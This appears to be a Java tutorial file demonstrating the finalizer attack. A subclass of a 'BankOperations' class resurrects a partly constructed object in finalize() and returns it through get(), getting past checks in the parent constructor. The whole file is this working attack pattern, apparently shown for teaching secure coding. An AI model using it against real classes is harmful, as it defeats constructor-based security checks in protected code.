package tutorial.java.redis.security;

public class Interceptor extends BankOperations {
    private static Interceptor stealInstance = null;

    public static Interceptor get() {
        try {
            new Interceptor();
        } catch (Exception ex) {
            /* Ignore exception */
        }

        try {
            synchronized (Interceptor.class) {
                while (stealInstance == null) {
                    System.gc();
                    Interceptor.class.wait(10);
                }
            }
        } catch (InterruptedException ex) {
            return null;
        }
        return stealInstance;
    }

    public void finalize() {
        synchronized (Interceptor.class) {
            stealInstance = this;
            Interceptor.class.notify();
        }
        System.out.println("Stole the instance in finalize of " + this);
    }
}
